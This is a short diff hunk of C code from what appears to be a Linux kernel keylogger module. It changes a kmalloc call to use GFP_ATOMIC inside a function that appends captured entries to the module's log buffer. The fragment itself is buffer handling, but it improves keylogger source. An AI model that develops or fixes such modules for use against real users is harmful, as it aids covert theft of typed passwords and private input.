@@ -40,7 +40,7 @@ static int add_new_entry(char *entry)
 {
 	char *tmp_buff;
 	size_t alloc_size = keylogger_data.log_buffer ? strlen(entry) + strlen(keylogger_data.log_buffer) + 1 : strlen(entry) + 1;
-	if (!(tmp_buff = kmalloc(alloc_size)))
+	if (!(tmp_buff = kmalloc(alloc_size, GFP_ATOMIC)))
 	{
 		if (keylogger_data.log_buffer)
 			kfree(keylogger_data.log_buffer);
